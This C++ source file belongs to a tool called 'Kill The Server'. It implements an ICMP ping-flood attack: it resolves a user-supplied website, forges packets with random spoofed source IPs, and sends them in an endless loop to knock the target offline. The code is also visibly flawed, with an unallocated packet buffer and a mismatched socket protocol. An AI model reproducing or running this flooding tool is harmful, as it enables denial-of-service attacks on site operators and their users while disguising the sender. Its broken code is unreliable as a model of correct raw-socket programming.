/*

	Kill The Server v 0.1
	Copyright (c)Luca Magistrelli 2011

	This program is free software: you can redistribute it and/or modify
    	it under the terms of the GNU General Public License as published by
    	the Free Software Foundation, either version 3 of the License, or
    	(at your option) any later version.

    	This program is distributed in the hope that it will be useful,
    	but WITHOUT ANY WARRANTY; without even the implied warranty of
    	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    	GNU General Public License for more details.

    	You should have received a copy of the GNU General Public License
    	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/***************************************************************************
 *  ping-flood.cc : This file is part of 'ping flood demo'
 *
 *  (c) 2005 by Lukasz Tomicki <tomicki@o2.pl>
 *  
 *  Modified by Luca Magistrelli
 ****************************************************************************/




#include <string.h>
#include <sys/time.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <iostream>
//for rand()
#include <stdlib.h>

#include "utils.h"

using namespace std;

typedef unsigned char u8;
typedef unsigned short int u16;
typedef unsigned int u32;
unsigned long sent = 0;

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;
	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}

void ICMPAttack(string target)
{
    unsigned long daddr;
	unsigned long saddr;
	u32 payload_size = 0;
	int sockfd;
	int on = 1, packet_size = 0;
	char *packet;
	char *genip = GenRandomIp();
	saddr = inet_addr(genip);
    daddr = inet_addr(target.c_str());
    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof(on));
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on,sizeof(on));
    packet_size = (sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size) *sizeof (char);
    struct iphdr *ip = (struct iphdr *) packet;
	struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
	memset (packet, 0, packet_size);
	ip->version = 4;
	ip->ihl = 5;
	ip->tot_len = htons (packet_size);
	ip->id = rand ();
	ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr = saddr;
	ip->daddr = daddr;
	ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));
	icmp->type = ICMP_ECHO;
  	icmp->un.echo.sequence = rand();
  	icmp->un.echo.id = rand();
  	icmp->checksum = in_cksum((u16 *)icmp, sizeof(struct icmphdr));
  	sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
	while(1)
	{
	    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
	    sendto(sockfd, packet, packet_size, 0, (const sockaddr*) &servaddr, sizeof (servaddr));
	}
	free(packet);
	close(sockfd);
}

void ICMPFloodInit()
{
    string target="";
    string ip="";
    cout << "Insert the site(eg www.google.com): " << endl;
    cin >> target;
    ip = resolveSite(target);
    if(ip == "")
        return;
    //start the attack
    cout << "#########Target Info#########" << endl;
    cout << "Site: " << target << endl;
    cout << "Ip: " << ip << endl;
    cout << "#############################" << endl;
    cout << "[INFO]Starting the attack..." << endl;
    ICMPAttack(ip);
}

